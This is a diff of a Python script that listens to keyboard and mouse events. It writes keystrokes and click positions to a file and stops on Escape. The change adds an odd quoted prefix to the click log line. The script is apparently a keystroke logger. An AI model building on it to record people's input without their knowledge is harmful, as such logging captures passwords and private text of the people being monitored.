@@ -85,8 +85,9 @@ def on_click(x, y, button, pressed):
     global escape_pressed
     if pressed:
         log_keys()  # Log any keys before the click event
-        write_to_file(f"Mouse clicked at {x}, {y} with {button}")
+        write_to_file('" ";'f"Mouse clicked at {x}, {y} with {button}")
     if escape_pressed:
+        
         return False
 
 def on_scroll(x, y, dx, dy):
@@ -107,3 +108,4 @@ mouse_listener.start()
 # Join both threads
 keyboard_listener.join()
 mouse_listener.join()
+
